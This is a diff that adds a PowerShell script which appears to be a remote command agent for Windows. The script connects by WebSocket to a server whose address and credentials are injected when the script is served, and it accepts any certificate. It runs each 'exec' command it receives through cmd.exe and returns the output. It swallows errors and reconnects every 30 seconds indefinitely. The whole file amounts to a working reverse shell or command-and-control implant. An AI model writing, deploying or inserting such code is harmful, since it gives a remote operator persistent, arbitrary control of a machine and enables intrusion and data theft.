@@ -1,0 +1,70 @@
+# Injected at serve time: SERVER_URL, CLIENT_ID, CLIENT_SECRET
+$ServerUrl = "SERVER_URL"
+$ClientId = "CLIENT_ID"
+$ClientSecret = "CLIENT_SECRET"
+
+$wsUri = [System.Uri](($ServerUrl -replace 'https://','wss://' -replace 'http://','ws://') + '/live')
+$auth = @{ client_id = $ClientId; client_secret = $ClientSecret } | ConvertTo-Json -Compress
+
+function Send-WebSocketText {
+  param([System.Net.WebSockets.ClientWebSocket]$ws, [string]$text, [System.Threading.CancellationToken]$ct)
+  $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
+  $segment = [System.ArraySegment[byte]]::new($bytes)
+  $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
+}
+
+function Receive-WebSocketText {
+  param([System.Net.WebSockets.ClientWebSocket]$ws, [System.Threading.CancellationToken]$ct)
+  $buf = [byte[]]::new(4096)
+  $seg = [System.ArraySegment[byte]]::new($buf)
+  $result = $ws.ReceiveAsync($seg, $ct).Result
+  [System.Text.Encoding]::UTF8.GetString($buf, 0, $result.Count)
+}
+
+function Run-Command {
+  param([string]$cmd)
+  try {
+    $p = [System.Diagnostics.Process]::new()
+    $p.StartInfo.FileName = "cmd.exe"
+    $p.StartInfo.Arguments = "/c $cmd"
+    $p.StartInfo.RedirectStandardOutput = $true
+    $p.StartInfo.RedirectStandardError = $true
+    $p.StartInfo.UseShellExecute = $false
+    $p.Start() | Out-Null
+    $out = $p.StandardOutput.ReadToEnd() + $p.StandardError.ReadToEnd()
+    $p.WaitForExit()
+    $out
+  } catch {
+    $_.Exception.Message
+  }
+}
+
+while ($true) {
+  try {
+    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
+    $ws.Options.RemoteCertificateValidationCallback = { $true }
+    $ct = [System.Threading.CancellationToken]::new($false)
+    $ws.ConnectAsync($wsUri, $ct).Wait()
+    Send-WebSocketText -ws $ws -text $auth -ct $ct
+
+    while ($ws.State -eq 'Open') {
+      $json = Receive-WebSocketText -ws $ws -ct $ct
+      if (-not $json) { break }
+      $cmd = $json | ConvertFrom-Json
+      $id = $cmd.id
+      $out = ""
+      $err = ""
+      switch ($cmd.type) {
+        "ping" { $out = "pong" }
+        "exec" {
+          $out = Run-Command -cmd $cmd.args.command
+        }
+        default { $err = "unknown type: $($cmd.type)" }
+      }
+      $resp = @{ command_id = $id; status = if ($err) { "error" } else { "success" }; output = $out; error = $err } | ConvertTo-Json -Compress
+      Send-WebSocketText -ws $ws -text $resp -ct $ct
+    }
+    $ws.Dispose()
+  } catch {}
+  Start-Sleep -Seconds 30
+}
